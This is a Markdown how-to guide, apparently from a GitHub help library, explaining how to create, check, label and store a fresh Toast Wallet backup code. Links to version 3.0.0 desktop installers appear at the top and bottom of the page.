<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Create a new Toast Wallet backup</h1>

<p align="center">Make a fresh backup code after any change to your accounts.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Open the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), unlock it, go to Settings and choose Backup Wallet. Copy the backup code to paper exactly, label it with the date and accounts, and store it with your passphrase or six recovery words. Do this after every change to your wallet.

## 👀 You'll see this if

- You never made a backup code, or you cannot find it.
- You just added a new account.
- You changed your passphrase.
- You are about to update, move computers or uninstall.

## 🤔 Why it matters

Everything in Toast Wallet recovery depends on the backup code. Without it, your wallet exists only on one computer. With it, you can rebuild your wallet anywhere. Because the code is a snapshot, it must be renewed whenever the wallet changes. An out-of-date backup restores an out-of-date wallet, which is the cause of most "missing account" stories.

Making a backup takes a minute. Not making one can cost everything. That imbalance is why every guide in this library asks you to make a fresh backup before and after important changes.

## 🧭 Before you start

Choose a private place and time. Check that no screen-sharing, remote-desktop or recording software is running. Prepare paper and a pen, plus an envelope or folder labelled clearly so you can find the backup years from now.

## 🛠️ Fix: make a backup step by step

1. **Open and unlock Toast Wallet.** Enter your PIN.
2. **Open Settings.** Choose Backup Wallet.
3. **Confirm if asked.** Toast Wallet may ask for your passphrase before showing the code.
4. **Copy the code to paper.** Write it slowly and clearly. Split it into groups of four or five characters to make checking easier.
5. **Check it twice.** Compare the paper with the screen, group by group.
6. **Label the sheet.** Write the date, the number of accounts and the first and last few characters of each address beginning with `r`.
7. **Store it with what opens it.** A backup code needs the passphrase or the six recovery words from the same time. Keep them together, or note clearly where each is kept. Read [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) for the reasoning.
8. **Make a second copy.** Store it in another safe location.
9. **Mark old backups as replaced.** Do not throw them away until you have tested the new one.
10. **Test once.** On a spare computer or after a reinstall, practise with [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).

## 🧩 Real-world example

Someone adds a second account to receive XRP from a different exchange. A year later their computer fails. They restore their only backup code, made on the day they installed the wallet, and the second account is missing. They had to search for an old computer to find it. Had they made a new backup the day they added the account, the restore would have brought both accounts back in one step. Five minutes of writing would have saved a week of worry.

## ⚠️ Common mistakes

- Taking a screenshot or phone photo of the backup code instead of writing it down.
- Writing the code in a hurry and swapping similar characters such as `0` and `O`.
- Storing the backup code but not the passphrase or six words that open it.
- Keeping several undated backups together so nobody knows which one is current.

## 🔁 If that did not work

- **You cannot find Backup Wallet.** You may be on an older version. Update following [update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md).
- **The passphrase is refused.** See [Toast Wallet passphrase not working](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-passphrase-not-working.md).
- **Accounts are missing from the wallet itself.** Fix that first with [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md), then back up.

## 🛡️ Prevention

Make a backup on a schedule as well as after changes, for example every New Year. Never store backup codes digitally. Combine this habit with the [keep Toast Wallet safe checklist](https://github.com/Toast-Wallet/learn/blob/main/how-to/keep-toast-wallet-safe-checklist.md).

## 🔍 A closer look at where to store backups

The ideal storage place is private, dry, protected from fire as far as practical, and somewhere you will still remember in ten years. A home safe, a locked drawer or a sealed envelope with important family documents are common choices. The second copy should be in a different building if possible, such as with a trusted relative or in a bank safe deposit box, so that a single fire or flood cannot destroy both.

Write a short instruction on the envelope that does not reveal the secrets themselves, for example: "Toast Wallet backup. Restore only in the official desktop app from GitHub. Never type into a website." This helps family members do the right thing if they ever need to act for you.

Finally, decide how you will know which backup is current. A simple approach is to write the date in large letters on the front of each envelope and to mark older ones "replaced" the moment a new one is created. When there is only one envelope without that mark, there is never any doubt about which code to use.

## 🧠 Remember

A backup only protects what existed when you made it. Treat the Backup Wallet button as the last step of any change: new account, new passphrase, new computer. If you are ever unsure whether your current backup is complete, make a new one. It costs nothing and takes a few minutes.

## ❓ FAQ

<details>
<summary>Does making a backup cost XRP?</summary>

No. It happens entirely inside the app on your computer.

</details>

<details>
<summary>How many backups should I keep?</summary>

One current backup in two safe places, plus clearly labelled older ones until the new one is tested.

</details>

<details>
<summary>Can I print the backup code?</summary>

Handwriting is safer. Printers and their queues can keep copies.

</details>

> [!WARNING]
> Never photograph, email or upload your backup code. Paper copies in safe places are the right home for it.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) | Why the encrypted backup code is the real key to restoring. |
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
| [Keep Toast Wallet safe checklist](https://github.com/Toast-Wallet/learn/blob/main/how-to/keep-toast-wallet-safe-checklist.md) | A short routine for backups, updates and safe habits. |
| [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md) | Why some accounts do not appear and how to bring them back. |
